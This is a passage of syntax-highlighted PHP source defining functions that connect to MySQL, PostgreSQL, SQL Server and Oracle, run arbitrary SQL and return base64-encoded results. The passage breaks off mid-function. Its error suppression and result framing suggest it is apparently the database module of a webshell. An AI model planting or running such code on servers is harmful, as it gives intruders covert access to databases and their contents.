    <span class="k">function</span> <span class="n">mysql_exec</span><span class="p">(</span><span class="nv">$host</span><span class="p">,</span> <span class="nv">$port</span><span class="p">,</span> <span class="nv">$username</span><span class="p">,</span> <span class="nv">$password</span><span class="p">,</span> <span class="nv">$execType</span><span class="p">,</span> <span class="nv">$currentDb</span><span class="p">,</span><span class="nv">$sql</span><span class="p">,</span><span class="nv">$charset</span><span class="p">)</span> <span class="p">{</span>
        <span class="nv">$con</span> <span class="o">=</span> <span class="o">@</span><span class="nb">mysql_connect</span><span class="p">(</span><span class="nv">$host</span><span class="mf">.</span><span class="s2">":"</span><span class="mf">.</span><span class="nv">$port</span><span class="p">,</span> <span class="nv">$username</span><span class="p">,</span> <span class="nv">$password</span><span class="p">);</span>
        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$con</span><span class="p">)</span> <span class="p">{</span>
            <span class="k">return</span> <span class="nb">mysql_error</span><span class="p">();</span>
        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
            <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$charset</span><span class="p">)){</span>
                <span class="nb">mysql_set_charset</span><span class="p">(</span><span class="nv">$charset</span><span class="p">,</span><span class="nv">$con</span><span class="p">);</span>
            <span class="p">}</span>
            <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$currentDb</span><span class="p">)){</span>
                <span class="k">if</span> <span class="p">(</span><span class="nf">function_existsEx</span><span class="p">(</span><span class="s2">"mysql_selectdb"</span><span class="p">)){</span>
                    <span class="nf">mysql_selectdb</span><span class="p">(</span><span class="nv">$currentDb</span><span class="p">,</span><span class="nv">$con</span><span class="p">);</span>
                <span class="p">}</span><span class="k">elseif</span> <span class="p">(</span><span class="nf">function_existsEx</span><span class="p">(</span><span class="s2">"mysql_select_db"</span><span class="p">)){</span>
                    <span class="nb">mysql_select_db</span><span class="p">(</span><span class="nv">$currentDb</span><span class="p">,</span><span class="nv">$con</span><span class="p">);</span>
                <span class="p">}</span>
            <span class="p">}</span>
            <span class="nv">$result</span> <span class="o">=</span> <span class="o">@</span><span class="nb">mysql_query</span><span class="p">(</span><span class="nv">$sql</span><span class="p">);</span>
            <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$result</span><span class="p">)</span> <span class="p">{</span>
                <span class="k">return</span> <span class="nb">mysql_error</span><span class="p">();</span>
            <span class="p">}</span>
            <span class="k">if</span> <span class="p">(</span><span class="nv">$execType</span> <span class="o">==</span> <span class="s2">"update"</span><span class="p">)</span> <span class="p">{</span>
                <span class="k">return</span> <span class="s2">"Query OK, "</span><span class="mf">.</span><span class="nb">mysql_affected_rows</span><span class="p">(</span><span class="nv">$con</span><span class="p">)</span><span class="mf">.</span><span class="s2">" rows affected"</span><span class="p">;</span>
            <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
                <span class="nv">$data</span> <span class="o">=</span> <span class="s2">"ok</span><span class="se">\n</span><span class="s2">"</span><span class="p">;</span>
                <span class="k">for</span> <span class="p">(</span><span class="nv">$i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nv">$i</span> <span class="o">&lt;</span> <span class="nb">mysql_num_fields</span><span class="p">(</span><span class="nv">$result</span><span class="p">);</span> <span class="nv">$i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
                    <span class="nv">$data</span><span class="mf">.</span><span class="o">=</span> <span class="nb">base64_encode</span><span class="p">(</span><span class="nb">mysql_field_name</span><span class="p">(</span><span class="nv">$result</span><span class="p">,</span> <span class="nv">$i</span><span class="p">))</span><span class="mf">.</span><span class="s2">"</span><span class="se">\t</span><span class="s2">"</span><span class="p">;</span>
                <span class="p">}</span>
                <span class="nv">$data</span><span class="mf">.</span><span class="o">=</span> <span class="s2">"</span><span class="se">\n</span><span class="s2">"</span><span class="p">;</span>
                <span class="nv">$rowNum</span> <span class="o">=</span> <span class="nb">mysql_num_rows</span><span class="p">(</span><span class="nv">$result</span><span class="p">);</span>
                <span class="k">if</span> <span class="p">(</span><span class="nv">$rowNum</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
                    <span class="k">while</span> <span class="p">(</span><span class="nv">$row</span> <span class="o">=</span> <span class="nb">mysql_fetch_row</span><span class="p">(</span><span class="nv">$result</span><span class="p">))</span> <span class="p">{</span>
                        <span class="k">foreach</span><span class="p">(</span><span class="nv">$row</span> <span class="k">as</span> <span class="nv">$value</span><span class="p">)</span> <span class="p">{</span>
                            <span class="nv">$data</span><span class="mf">.</span><span class="o">=</span> <span class="nb">base64_encode</span><span class="p">(</span><span class="nv">$value</span><span class="p">)</span><span class="mf">.</span><span class="s2">"</span><span class="se">\t</span><span class="s2">"</span><span class="p">;</span>
                        <span class="p">}</span>
                        <span class="nv">$data</span><span class="mf">.</span><span class="o">=</span> <span class="s2">"</span><span class="se">\n</span><span class="s2">"</span><span class="p">;</span>
                    <span class="p">}</span>
                <span class="p">}</span>
            <span class="p">}</span>
            <span class="o">@</span><span class="nb">mysql_close</span><span class="p">(</span><span class="nv">$con</span><span class="p">);</span>
            <span class="k">return</span> <span class="nv">$data</span><span class="p">;</span>
        <span class="p">}</span>
    <span class="p">}</span>
    <span class="k">function</span> <span class="n">mysqliEx_exec</span><span class="p">(</span><span class="nv">$host</span><span class="p">,</span> <span class="nv">$port</span><span class="p">,</span> <span class="nv">$username</span><span class="p">,</span> <span class="nv">$password</span><span class="p">,</span> <span class="nv">$execType</span><span class="p">,</span> <span class="nv">$currentDb</span><span class="p">,</span><span class="nv">$sql</span><span class="p">,</span><span class="nv">$charset</span><span class="p">){</span>
        <span class="nv">$port</span> <span class="o">==</span> <span class="s2">""</span> <span class="o">?</span> <span class="nv">$port</span> <span class="o">=</span> <span class="s2">"3306"</span> <span class="o">:</span> <span class="nv">$port</span><span class="p">;</span>
        <span class="nv">$T</span><span class="o">=@</span><span class="nb">mysqli_connect</span><span class="p">(</span><span class="nv">$host</span><span class="p">,</span><span class="nv">$username</span><span class="p">,</span><span class="nv">$password</span><span class="p">,</span><span class="s2">""</span><span class="p">,</span><span class="nv">$port</span><span class="p">);</span>
        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$charset</span><span class="p">)){</span>
            <span class="o">@</span><span class="nf">mysqli_set_charset</span><span class="p">(</span><span class="nv">$charset</span><span class="p">);</span>
        <span class="p">}</span>
        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$currentDb</span><span class="p">)){</span>
            <span class="o">@</span><span class="nf">mysqli_select_db</span><span class="p">(</span><span class="nv">$T</span><span class="p">,</span><span class="nv">$currentDb</span><span class="p">);</span>
        <span class="p">}</span>
        <span class="nv">$q</span><span class="o">=@</span><span class="nf">mysqli_query</span><span class="p">(</span><span class="nv">$T</span><span class="p">,</span><span class="nv">$sql</span><span class="p">);</span>
        <span class="k">if</span><span class="p">(</span><span class="nb">is_bool</span><span class="p">(</span><span class="nv">$q</span><span class="p">)){</span>
            <span class="k">return</span> <span class="nf">mysqli_error</span><span class="p">(</span><span class="nv">$T</span><span class="p">);</span>
        <span class="p">}</span><span class="k">else</span><span class="p">{</span>
            <span class="k">if</span> <span class="p">(</span><span class="nf">mysqli_num_fields</span><span class="p">(</span><span class="nv">$q</span><span class="p">)</span><span class="o">&gt;</span><span class="mi">0</span><span class="p">){</span>
                <span class="nv">$i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span>
                <span class="nv">$data</span> <span class="o">=</span> <span class="s2">"ok</span><span class="se">\n</span><span class="s2">"</span><span class="p">;</span>
                <span class="k">while</span><span class="p">(</span><span class="nv">$col</span><span class="o">=@</span><span class="nf">mysqli_fetch_field</span><span class="p">(</span><span class="nv">$q</span><span class="p">)){</span>
                    <span class="nv">$data</span><span class="mf">.</span><span class="o">=</span><span class="nb">base64_encode</span><span class="p">(</span><span class="nv">$col</span><span class="o">-&gt;</span><span class="n">name</span><span class="p">)</span><span class="mf">.</span><span class="s2">"</span><span class="se">\t</span><span class="s2">"</span><span class="p">;</span>
                    <span class="nv">$i</span><span class="o">++</span><span class="p">;</span>
                <span class="p">}</span>
                <span class="nv">$data</span><span class="mf">.</span><span class="o">=</span><span class="s2">"</span><span class="se">\n</span><span class="s2">"</span><span class="p">;</span>
                <span class="k">while</span><span class="p">(</span><span class="nv">$rs</span><span class="o">=@</span><span class="nf">mysqli_fetch_row</span><span class="p">(</span><span class="nv">$q</span><span class="p">)){</span>
                    <span class="k">for</span><span class="p">(</span><span class="nv">$c</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="nv">$c</span><span class="o">&lt;</span><span class="nv">$i</span><span class="p">;</span><span class="nv">$c</span><span class="o">++</span><span class="p">){</span>
                        <span class="nv">$data</span><span class="mf">.</span><span class="o">=</span><span class="nb">base64_encode</span><span class="p">(</span><span class="nb">trim</span><span class="p">(</span><span class="nv">$rs</span><span class="p">[</span><span class="nv">$c</span><span class="p">]))</span><span class="mf">.</span><span class="s2">"</span><span class="se">\t</span><span class="s2">"</span><span class="p">;</span>
                    <span class="p">}</span>
                    <span class="nv">$data</span><span class="mf">.</span><span class="o">=</span><span class="s2">"</span><span class="se">\n</span><span class="s2">"</span><span class="p">;</span>
                <span class="p">}</span>
                <span class="k">return</span> <span class="nv">$data</span><span class="p">;</span>
            <span class="p">}</span><span class="k">else</span><span class="p">{</span>
                <span class="k">return</span> <span class="s2">"Query OK, "</span><span class="mf">.</span><span class="o">@</span><span class="nf">mysqli_affected_rows</span><span class="p">(</span><span class="nv">$T</span><span class="p">)</span><span class="mf">.</span><span class="s2">" rows affected"</span><span class="p">;</span>
            <span class="p">}</span>
        <span class="p">}</span>
    <span class="p">}</span>
    <span class="k">function</span> <span class="n">pg_execEx</span><span class="p">(</span><span class="nv">$host</span><span class="p">,</span> <span class="nv">$port</span><span class="p">,</span> <span class="nv">$username</span><span class="p">,</span> <span class="nv">$password</span><span class="p">,</span> <span class="nv">$execType</span><span class="p">,</span><span class="nv">$currentDb</span><span class="p">,</span> <span class="nv">$sql</span><span class="p">,</span><span class="nv">$charset</span><span class="p">){</span>
        <span class="nv">$port</span> <span class="o">==</span> <span class="s2">""</span> <span class="o">?</span> <span class="nv">$port</span> <span class="o">=</span> <span class="s2">"5432"</span> <span class="o">:</span> <span class="nv">$port</span><span class="p">;</span>
        <span class="nv">$arr</span><span class="o">=</span><span class="k">array</span><span class="p">(</span>
            <span class="s1">'host'</span><span class="o">=&gt;</span><span class="nv">$host</span><span class="p">,</span>
            <span class="s1">'port'</span><span class="o">=&gt;</span><span class="nv">$port</span><span class="p">,</span>
            <span class="s1">'user'</span><span class="o">=&gt;</span><span class="nv">$username</span><span class="p">,</span>
            <span class="s1">'password'</span><span class="o">=&gt;</span><span class="nv">$password</span>
        <span class="p">);</span>
        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$currentDb</span><span class="p">)){</span>
            <span class="nv">$arr</span><span class="p">[</span><span class="s2">"dbname"</span><span class="p">]</span><span class="o">=</span><span class="nv">$currentDb</span><span class="p">;</span>
        <span class="p">}</span>
        <span class="nv">$cs</span><span class="o">=</span><span class="s1">''</span><span class="p">;</span>
        <span class="k">foreach</span><span class="p">(</span><span class="nv">$arr</span> <span class="k">as</span> <span class="nv">$k</span><span class="o">=&gt;</span><span class="nv">$v</span><span class="p">)</span> <span class="p">{</span>
            <span class="k">if</span><span class="p">(</span><span class="k">empty</span><span class="p">(</span><span class="nv">$v</span><span class="p">)){</span>
                <span class="k">continue</span><span class="p">;</span>
            <span class="p">}</span>
            <span class="nv">$cs</span> <span class="mf">.</span><span class="o">=</span> <span class="s2">"</span><span class="nv">$k</span><span class="s2">=</span><span class="nv">$v</span><span class="s2"> "</span><span class="p">;</span>
        <span class="p">}</span>
        <span class="nv">$T</span><span class="o">=@</span><span class="nb">pg_connect</span><span class="p">(</span><span class="nv">$cs</span><span class="p">);</span>
        <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nv">$T</span><span class="p">){</span>
            <span class="k">return</span> <span class="o">@</span><span class="nb">pg_last_error</span><span class="p">();</span>
        <span class="p">}</span><span class="k">else</span><span class="p">{</span>
            <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$charset</span><span class="p">)){</span>
                <span class="o">@</span><span class="nb">pg_set_client_encoding</span><span class="p">(</span><span class="nv">$T</span><span class="p">,</span><span class="nv">$charset</span><span class="p">);</span>
            <span class="p">}</span>
            <span class="nv">$q</span><span class="o">=@</span><span class="nb">pg_query</span><span class="p">(</span><span class="nv">$T</span><span class="p">,</span> <span class="nv">$sql</span><span class="p">);</span>
            <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nv">$q</span><span class="p">){</span>
                <span class="k">return</span> <span class="o">@</span><span class="nb">pg_last_error</span><span class="p">();</span>
            <span class="p">}</span><span class="k">else</span><span class="p">{</span>
                <span class="nv">$n</span><span class="o">=@</span><span class="nb">pg_num_fields</span><span class="p">(</span><span class="nv">$q</span><span class="p">);</span>
                <span class="k">if</span><span class="p">(</span><span class="nv">$n</span><span class="o">===</span><span class="kc">NULL</span><span class="p">){</span>
                    <span class="k">return</span> <span class="o">@</span><span class="nb">pg_last_error</span><span class="p">();</span>
                <span class="p">}</span><span class="k">elseif</span><span class="p">(</span><span class="nv">$n</span><span class="o">===</span><span class="mi">0</span><span class="p">){</span>
                    <span class="k">return</span> <span class="s2">"Query OK, "</span><span class="mf">.</span><span class="o">@</span><span class="nb">pg_affected_rows</span><span class="p">(</span><span class="nv">$q</span><span class="p">)</span><span class="mf">.</span><span class="s2">" rows affected"</span><span class="p">;</span>
                <span class="p">}</span><span class="k">else</span><span class="p">{</span>
                    <span class="nv">$data</span> <span class="o">=</span> <span class="s2">"ok</span><span class="se">\n</span><span class="s2">"</span><span class="p">;</span>
                    <span class="k">for</span><span class="p">(</span><span class="nv">$i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="nv">$i</span><span class="o">&lt;</span><span class="nv">$n</span><span class="p">;</span><span class="nv">$i</span><span class="o">++</span><span class="p">){</span>
                        <span class="nv">$data</span><span class="mf">.</span><span class="o">=</span><span class="nb">base64_encode</span><span class="p">(</span><span class="o">@</span><span class="nb">pg_field_name</span><span class="p">(</span><span class="nv">$q</span><span class="p">,</span><span class="nv">$i</span><span class="p">))</span><span class="mf">.</span><span class="s2">"</span><span class="se">\t</span><span class="s2">"</span><span class="p">;</span>
                    <span class="p">}</span>
                    <span class="nv">$data</span><span class="mf">.</span><span class="o">=</span> <span class="s2">"</span><span class="se">\n</span><span class="s2">"</span><span class="p">;</span>
                    <span class="k">while</span><span class="p">(</span><span class="nv">$row</span><span class="o">=@</span><span class="nb">pg_fetch_row</span><span class="p">(</span><span class="nv">$q</span><span class="p">)){</span>
                        <span class="k">for</span><span class="p">(</span><span class="nv">$i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="nv">$i</span><span class="o">&lt;</span><span class="nv">$n</span><span class="p">;</span><span class="nv">$i</span><span class="o">++</span><span class="p">){</span>
                            <span class="nv">$data</span><span class="mf">.</span><span class="o">=</span><span class="nb">base64_encode</span><span class="p">(</span><span class="nv">$row</span><span class="p">[</span><span class="nv">$i</span><span class="p">]</span><span class="o">!==</span><span class="kc">NULL</span><span class="o">?</span><span class="nv">$row</span><span class="p">[</span><span class="nv">$i</span><span class="p">]</span><span class="o">:</span><span class="s2">"NULL"</span><span class="p">)</span><span class="mf">.</span><span class="s2">"</span><span class="se">\t</span><span class="s2">"</span><span class="p">;</span>
                        <span class="p">}</span>
                        <span class="nv">$data</span><span class="mf">.</span><span class="o">=</span> <span class="s2">"</span><span class="se">\n</span><span class="s2">"</span><span class="p">;</span>
                    <span class="p">}</span>
                    <span class="k">return</span> <span class="nv">$data</span><span class="p">;</span>
                <span class="p">}</span>
            <span class="p">}</span>
        <span class="p">}</span>
    <span class="p">}</span>
    <span class="k">function</span> <span class="n">sqlsrv_exec</span><span class="p">(</span><span class="nv">$host</span><span class="p">,</span> <span class="nv">$port</span><span class="p">,</span> <span class="nv">$username</span><span class="p">,</span> <span class="nv">$password</span><span class="p">,</span> <span class="nv">$execType</span><span class="p">,</span> <span class="nv">$currentDb</span><span class="p">,</span><span class="nv">$sql</span><span class="p">){</span>

        <span class="nv">$dbConfig</span><span class="o">=</span><span class="k">array</span><span class="p">(</span><span class="s2">"UID"</span><span class="o">=&gt;</span> <span class="nv">$username</span><span class="p">,</span><span class="s2">"PWD"</span><span class="o">=&gt;</span><span class="nv">$password</span><span class="p">);</span>
        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$currentDb</span><span class="p">)){</span>
            <span class="nv">$dbConfig</span><span class="p">[</span><span class="s2">"Database"</span><span class="p">]</span><span class="o">=</span><span class="nv">$currentDb</span><span class="p">;</span>
        <span class="p">}</span>

        <span class="nv">$T</span><span class="o">=@</span><span class="nb">sqlsrv_connect</span><span class="p">(</span><span class="nv">$host</span><span class="p">,</span><span class="nv">$dbConfig</span><span class="p">);</span>
        <span class="nv">$q</span><span class="o">=@</span><span class="nb">sqlsrv_query</span><span class="p">(</span><span class="nv">$T</span><span class="p">,</span><span class="nv">$sql</span><span class="p">,</span><span class="kc">null</span><span class="p">);</span>
        <span class="k">if</span><span class="p">(</span><span class="nv">$q</span><span class="o">!==</span><span class="kc">false</span><span class="p">){</span>
            <span class="nv">$i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span>
            <span class="nv">$fm</span><span class="o">=@</span><span class="nb">sqlsrv_field_metadata</span><span class="p">(</span><span class="nv">$q</span><span class="p">);</span>
            <span class="k">if</span><span class="p">(</span><span class="k">empty</span><span class="p">(</span><span class="nv">$fm</span><span class="p">)){</span>
                <span class="nv">$ar</span><span class="o">=@</span><span class="nb">sqlsrv_rows_affected</span><span class="p">(</span><span class="nv">$q</span><span class="p">);</span>
                <span class="k">return</span> <span class="s2">"Query OK, "</span><span class="mf">.</span><span class="nv">$ar</span><span class="mf">.</span><span class="s2">" rows affected"</span><span class="p">;</span>
            <span class="p">}</span><span class="k">else</span><span class="p">{</span>
                <span class="nv">$data</span> <span class="o">=</span> <span class="s2">"ok</span><span class="se">\n</span><span class="s2">"</span><span class="p">;</span>

                <span class="k">foreach</span><span class="p">(</span><span class="nv">$fm</span> <span class="k">as</span> <span class="nv">$rs</span><span class="p">){</span>
                    <span class="nv">$data</span><span class="mf">.</span><span class="o">=</span><span class="nb">base64_encode</span><span class="p">(</span><span class="nv">$rs</span><span class="p">[</span><span class="s1">'Name'</span><span class="p">])</span><span class="mf">.</span><span class="s2">"</span><span class="se">\t</span><span class="s2">"</span><span class="p">;</span>
                    <span class="nv">$i</span><span class="o">++</span><span class="p">;</span>
                <span class="p">}</span>
                <span class="nv">$data</span><span class="mf">.</span><span class="o">=</span> <span class="s2">"</span><span class="se">\n</span><span class="s2">"</span><span class="p">;</span>
                <span class="k">while</span><span class="p">(</span><span class="nv">$rs</span><span class="o">=@</span><span class="nb">sqlsrv_fetch_array</span><span class="p">(</span><span class="nv">$q</span><span class="p">,</span><span class="no">SQLSRV_FETCH_NUMERIC</span><span class="p">)){</span>
                    <span class="k">for</span><span class="p">(</span><span class="nv">$c</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="nv">$c</span><span class="o">&lt;</span><span class="nv">$i</span><span class="p">;</span><span class="nv">$c</span><span class="o">++</span><span class="p">){</span>
                        <span class="nv">$data</span><span class="mf">.</span><span class="o">=</span><span class="nb">base64_encode</span><span class="p">(</span><span class="nb">trim</span><span class="p">(</span><span class="nv">$rs</span><span class="p">[</span><span class="nv">$c</span><span class="p">]))</span><span class="mf">.</span><span class="s2">"</span><span class="se">\t</span><span class="s2">"</span><span class="p">;</span>
                    <span class="p">}</span>
                    <span class="nv">$data</span><span class="mf">.</span><span class="o">=</span> <span class="s2">"</span><span class="se">\n</span><span class="s2">"</span><span class="p">;</span>
                <span class="p">}</span>
                <span class="k">return</span> <span class="nv">$data</span><span class="p">;</span>
            <span class="p">}</span>
        <span class="p">}</span><span class="k">else</span><span class="p">{</span>
            <span class="nv">$err</span><span class="o">=</span><span class="s2">""</span><span class="p">;</span>
            <span class="k">if</span><span class="p">((</span><span class="nv">$e</span> <span class="o">=</span> <span class="nb">sqlsrv_errors</span><span class="p">())</span> <span class="o">!=</span> <span class="kc">null</span><span class="p">){</span>
                <span class="k">foreach</span><span class="p">(</span><span class="nv">$e</span> <span class="k">as</span> <span class="nv">$v</span><span class="p">){</span>
                    <span class="nv">$err</span><span class="mf">.</span><span class="o">=</span><span class="p">(</span><span class="nv">$e</span><span class="p">[</span><span class="s1">'message'</span><span class="p">])</span><span class="mf">.</span><span class="s2">"</span><span class="se">\n</span><span class="s2">"</span><span class="p">;</span>
                <span class="p">}</span>
            <span class="p">}</span>
            <span class="k">return</span> <span class="nv">$err</span><span class="p">;</span>
        <span class="p">}</span>
    <span class="p">}</span>
    <span class="k">function</span> <span class="n">mssql_exec</span><span class="p">(</span><span class="nv">$host</span><span class="p">,</span> <span class="nv">$port</span><span class="p">,</span> <span class="nv">$username</span><span class="p">,</span> <span class="nv">$password</span><span class="p">,</span> <span class="nv">$execType</span><span class="p">,</span><span class="nv">$currentDb</span><span class="p">,</span> <span class="nv">$sql</span><span class="p">){</span>
        <span class="nv">$T</span><span class="o">=@</span><span class="nb">mssql_connect</span><span class="p">(</span><span class="nv">$host</span><span class="p">,</span><span class="nv">$username</span><span class="p">,</span><span class="nv">$password</span><span class="p">);</span>
        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$currentDb</span><span class="p">)){</span>
            <span class="o">@</span><span class="nb">mssql_select_db</span><span class="p">(</span><span class="nv">$currentDb</span><span class="p">);</span>
        <span class="p">}</span>
        <span class="nv">$q</span><span class="o">=@</span><span class="nb">mssql_query</span><span class="p">(</span><span class="nv">$sql</span><span class="p">,</span><span class="nv">$T</span><span class="p">);</span>
        <span class="k">if</span><span class="p">(</span><span class="nb">is_bool</span><span class="p">(</span><span class="nv">$q</span><span class="p">)){</span>
            <span class="k">return</span> <span class="s2">"Query OK, "</span><span class="mf">.</span><span class="o">@</span><span class="nb">mssql_rows_affected</span><span class="p">(</span><span class="nv">$T</span><span class="p">)</span><span class="mf">.</span><span class="s2">" rows affected"</span><span class="p">;</span>
        <span class="p">}</span><span class="k">else</span><span class="p">{</span>
            <span class="nv">$data</span> <span class="o">=</span> <span class="s2">"ok</span><span class="se">\n</span><span class="s2">"</span><span class="p">;</span>
            <span class="nv">$i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span>
            <span class="k">while</span><span class="p">(</span><span class="nv">$rs</span><span class="o">=@</span><span class="nb">mssql_fetch_field</span><span class="p">(</span><span class="nv">$q</span><span class="p">)){</span>
                <span class="nv">$data</span><span class="mf">.</span><span class="o">=</span><span class="nb">base64_encode</span><span class="p">(</span><span class="nv">$rs</span><span class="o">-&gt;</span><span class="n">name</span><span class="p">)</span><span class="mf">.</span><span class="s2">"</span><span class="se">\t</span><span class="s2">"</span><span class="p">;</span>
                <span class="nv">$i</span><span class="o">++</span><span class="p">;</span>
            <span class="p">}</span>
            <span class="nv">$data</span><span class="mf">.</span><span class="o">=</span><span class="s2">"</span><span class="se">\n</span><span class="s2">"</span><span class="p">;</span>
            <span class="k">while</span><span class="p">(</span><span class="nv">$rs</span><span class="o">=@</span><span class="nb">mssql_fetch_row</span><span class="p">(</span><span class="nv">$q</span><span class="p">)){</span>
                <span class="k">for</span><span class="p">(</span><span class="nv">$c</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="nv">$c</span><span class="o">&lt;</span><span class="nv">$i</span><span class="p">;</span><span class="nv">$c</span><span class="o">++</span><span class="p">){</span>
                    <span class="nv">$data</span><span class="mf">.</span><span class="o">=</span><span class="nb">base64_encode</span><span class="p">(</span><span class="nb">trim</span><span class="p">(</span><span class="nv">$rs</span><span class="p">[</span><span class="nv">$c</span><span class="p">]))</span><span class="mf">.</span><span class="s2">"</span><span class="se">\t</span><span class="s2">"</span><span class="p">;</span>
                <span class="p">}</span>
                <span class="nv">$data</span><span class="mf">.</span><span class="o">=</span><span class="s2">"</span><span class="se">\n</span><span class="s2">"</span><span class="p">;</span>
            <span class="p">}</span>
            <span class="o">@</span><span class="nb">mssql_free_result</span><span class="p">(</span><span class="nv">$q</span><span class="p">);</span>
            <span class="o">@</span><span class="nb">mssql_close</span><span class="p">(</span><span class="nv">$T</span><span class="p">);</span>
            <span class="k">return</span> <span class="nv">$data</span><span class="p">;</span>
        <span class="p">}</span>
    <span class="p">}</span>
    <span class="k">function</span> <span class="n">oci_exec</span><span class="p">(</span><span class="nv">$host</span><span class="p">,</span> <span class="nv">$port</span><span class="p">,</span> <span class="nv">$username</span><span class="p">,</span> <span class="nv">$password</span><span class="p">,</span> <span class="nv">$execType</span><span class="p">,</span> <span class="nv">$currentDb</span><span class="p">,</span> <span class="nv">$sql</span><span class="p">,</span> <span class="nv">$charset</span><span class="p">)</span> <span class="p">{</span>
        <span class="nv">$chs</span> <span class="o">=</span> <span class="nv">$charset</span> <span class="o">?</span> <span class="nv">$charset</span> <span class="o">:</span> <span class="s2">"utf8"</span><span class="p">;</span>
        <span class="nv">$mod</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
        <span class="nv">$H</span> <span class="o">=</span> <span class="o">@</span><span class="nb">oci_connect</span><span class="p">(</span><span class="nv">$username</span><span class="p">,</span> <span class="nv">$password</span><span class="p">,</span> <span class="nv">$host</span><span class="p">,</span> <span class="nv">$chs</span><span class="p">,</span> <span class="nv">$mod</span><span class="p">);</span>
        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$H</span><span class="p">)</span> <span class="p">{</span>
            <span class="nv">$errObj</span><span class="o">=@</span><span class="nb">oci_error</span><span class="p">();</span>
            <span class="k">return</span> <span class="nv">$errObj</span><span class="p">[</span><span class="s2">"message"</span><span class="p">];</span>
        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
            <span class="nv">$q</span> <span class="o">=</span> <span class="o">@</span><span class="nb">oci_parse</span><span class="p">(</span><span class="nv">$H</span><span class="p">,</span> <span class="nv">$sql</span><span class="p">);</span>
            <span class="k">if</span> <span class="p">(</span><span class="o">@</span><span class="nb">oci_execute</span><span class="p">(</span><span class="nv">$q</span><span class="p">))</span> <span class="p">{</span>
                <span class="nv">$n</span> <span class="o">=</span> <span class="nb">oci_num_fields</span><span class="p">(</span><span class="nv">$q</span><span class="p">);</span>
                <span class="k">if</span> <span class="p">(</span><span class="nv">$n</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
                    <span class="k">return</span> <span class="s2">"Query OK, "</span><span class="mf">.</span><span class="o">@</span><span class="nb">oci_num_rows</span><span class="p">(</span><span class="nv">$q</span><span class="p">)</span><span class="mf">.</span><span class="s2">" rows affected"</span><span class="p">;</span>
                <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
                    <span class="nv">$data</span> <span class="o">=</span> <span class="s2">"ok</span><span class="se">\n</span><span class="s2">"</span><span class="p">;</span>
                    <span class="k">for</span> <span class="p">(</span><span class="nv">$i</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span> <span class="nv">$i</span> <span class="o">&lt;=</span> <span class="nv">$n</span><span class="p">;</span> <span class="nv">$i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
                        <span class="nv">$data</span><span class="mf">.</span><span class="o">=</span> <span class="nb">base64_encode</span><span class="p">(</span><span class="nb">oci_field_name</span><span class="p">(</span><span class="nv">$q</span><span class="p">,</span> <span class="nv">$i</span><span class="p">))</span><span class="mf">.</span><span class="s2">"</span><span class="se">\t</span><span class="s2">"</span><span class="p">;</span>
                    <span class="p">}</span>
                    <span class="nv">$data</span><span class="mf">.</span><span class="o">=</span> <span class="s2">"</span><span class="se">\n</span><span class="s2">"</span><span class="p">;</span>
                    <span class="k">while</span> <span class="p">(</span><span class="nv">$row</span> <span class="o">=</span> <span class="o">@</span><span class="nb">oci_fetch_array</span><span class="p">(</span><span class="nv">$q</span><span class="p">,</span> <span class="no">OCI_ASSOC</span> <span class="o">+</span> <span class="no">OCI_RETURN_NULLS</span><span class="p">))</span> <span class="p">{</span>
                        <span class="k">foreach</span><span class="p">(</span><span class="nv">$row</span> <span class="k">as</span> <span class="nv">$item</span><span class="p">)</span> <span class="p">{</span>
                            <span class="nv">$data</span><span class="mf">.</span><span class="o">=</span> <span class="nb">base64_encode</span><span class="p">(</span><span class="nv">$item</span> <span class="o">!==</span> <span class="kc">null</span> <span class="o">?</span> <span class="nb">base64_encode</span><span class="p">(</span><span class="nv">$item</span><span class="p">)</span> <span class="o">:</span> <span class="s2">""</span><span class="p">)</span><span class="mf">.</span> <span class="s2">"</span><span class="se">\t</span><span class="s2">"</span><span class="p">;</span>
                        <span class="p">}</span>
                        <span class="nv">$data</span><span class="mf">.</span><span class="o">=</span> <span class="s2">"</span><span class="se">\n</span><span class="s2">"</span><span class="p">;</span>
                    <span class="p">}</span>
                    <span class="k">return</span> <span class="nv">$data</span><span class="p">;</span>
                <span class="p">}</span>
            <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
                <span class="nv">$e</span> <span class="o">=</span> <span class="o">@</span><span class="nb">oci_error</span><span class="p">(</span><span class="nv">$q</span><span class="p">);</span>
